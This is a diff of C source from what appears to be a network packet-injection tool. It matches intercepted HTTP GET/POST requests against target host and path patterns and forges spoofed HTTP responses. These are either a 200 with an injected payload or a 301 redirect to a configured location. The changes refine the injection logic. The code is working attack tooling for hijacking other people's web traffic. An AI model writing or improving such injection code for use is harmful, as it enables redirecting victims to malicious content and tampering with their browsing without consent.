@@ -219,14 +219,16 @@ void ao_payload_pck(st_ao_packet* pck)
     http_parser_execute(&http_inst, &http_settings, NULL, 0);
     
     // Log
-    if (http_inst.method == HTTP_GET || http_inst.method == HTTP_POST) {
-        g_print("[pay] http request! host=%s, request=%s\n",
-            http_data.hdr_host ? http_data.hdr_host : "<NULL>",
-            http_data.req_url ? http_data.req_url : "<NULL>"
-        );
-        
-        // Inject
-        ao_payload_cap(pck, &http_data);
+    if (http_data.hdr_host || http_data.req_url) {
+        if (http_inst.method == HTTP_GET || http_inst.method == HTTP_POST) {
+            g_print("[pay] http request! host=%s, request=%s\n",
+                http_data.hdr_host ? http_data.hdr_host : "<NULL>",
+                http_data.req_url ? http_data.req_url : "<NULL>"
+            );
+            
+            // Inject
+            ao_payload_cap(pck, &http_data);
+        }
     }
     
     // Free
@@ -255,10 +257,10 @@ void ao_payload_cap(st_ao_packet* pck, st_http_data* http_data)
             
             gint match_host = 0;
             if (target->cap_http_host && http_data->hdr_host)
-                match_host = g_regex_match_simple(target->cap_http_host, http_data->hdr_host, 0, 0) ? 2 : 1;      
+                match_host = g_regex_match_simple(target->cap_http_host, http_data->hdr_host, 0, 0) ? 2 : 1;
             
             // Check if matches
-            g_print("[pay] http match! path=%d, host=%d\n", match_path, match_host);
+            //g_print("[pay] http match! path=%d, host=%d\n", match_path, match_host);
             if ((match_path == 2 || match_host == 2) && !(match_path == 1 || match_host == 1)) {
                 ao_payload_inj(pck, target);
                 return;
@@ -285,21 +287,25 @@ void ao_payload_inj(st_ao_packet* pck, st_pl_target* target)
         
         // Allocate data
         gchar* inj_location = NULL;
-        if (target->inj_http_location)
-            inj_location = g_strdup_printf("Location: %s\r\n", target->inj_http_location);
-        gchar* inj_head = g_strdup_printf(
-            "HTTP/1.1 %u OK\r\n"
-            "Content-Type: %s\r\n"
-            "Content-Length: %u\r\n"
-            "%s"
-            "\r\n",
-            inj_location ? 301 : 200,
-            target->inj_http_content_type != NULL ? target->inj_http_content_type : "text/html; charset=utf-8",
-            target->inj_http_pl_size,
-            inj_location ? inj_location : ""
-        );
-        if (inj_location)
-            g_free(inj_location);
+        gchar* inj_head = NULL;
+        if (target->inj_http_location) {
+            inj_head = g_strdup_printf(
+                "HTTP/1.1 301 Moved Permanently\r\n"
+                "Location: %s\r\n\r\n",
+                target->inj_http_location
+            );
+        } else {
+            inj_head = g_strdup_printf(
+                "HTTP/1.1 200 OK\r\n"
+                "Content-Type: %s\r\n"
+                "Content-Length: %u\r\n"
+                "%s"
+                "\r\n",
+                target->inj_http_content_type != NULL ? target->inj_http_content_type : "text/html; charset=utf-8",
+                target->inj_http_pl_size,
+                inj_location ? inj_location : ""
+            );
+        }
         
         // Copy data
         guint8* inj_data = g_malloc(strlen(inj_head) + target->inj_http_pl_size);
